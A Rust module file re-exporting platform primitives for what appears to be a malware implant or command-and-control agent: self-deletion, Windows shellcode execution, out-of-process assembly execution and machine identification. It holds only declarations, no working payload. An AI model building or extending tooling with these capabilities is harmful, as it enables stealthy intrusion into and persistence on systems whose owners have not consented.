//! Platform-specific primitives.
//!
//! Replaces `platform/`. The `#[cfg]`-gated submodules hold the
//! per-OS implementations; `mod.rs` re-exports the public symbols
//! so callers use `platform::self_delete()` and
//! `platform::exec_shellcode_windows()` without knowing the
//! platform split.

pub mod machine_id;
pub mod self_delete;
pub mod shellcode_exec;
pub mod worker;

// Re-export the symbols callers actually use.
pub use machine_id::machine_id;
pub use self_delete::self_delete;
pub use shellcode_exec::exec_shellcode_windows;
pub use worker::{
    exec_assembly_out_of_process, is_worker_mode, run_worker,
};